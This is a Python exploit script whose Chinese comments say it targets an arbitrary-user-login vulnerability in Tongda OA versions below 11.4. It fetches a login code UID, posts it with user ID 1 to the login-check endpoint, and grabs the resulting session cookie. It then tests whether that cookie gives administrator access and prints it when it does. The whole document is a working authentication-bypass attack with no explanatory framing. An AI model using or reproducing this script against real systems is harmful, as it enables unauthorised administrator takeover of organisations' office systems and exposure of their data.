import requests
import time
from random import choice

def getSession(host): # 通达<V11.4任意用户登录获取cookie
    print('[->] 正在检测通达<V11.4任意用户登录获取cookie')
    checkUrl = host+'general/login_code.php'
    try:
        headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = host+'logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)
        tmp_cookie = res.headers['Set-Cookie']
        # PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(res.headers))[0]
        headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Cookie': tmp_cookie
    }
        check_available = requests.get(host + 'general/index.php',headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                print('[*] 成功获得管理员cookie:' + tmp_cookie + '\n')
        else:
            print('[-] 未能获取管理员cookie\n')
    except:
        print('[-] 不存在该漏洞\n')

def run(host):
    time.sleep(6)
    getSession(host)
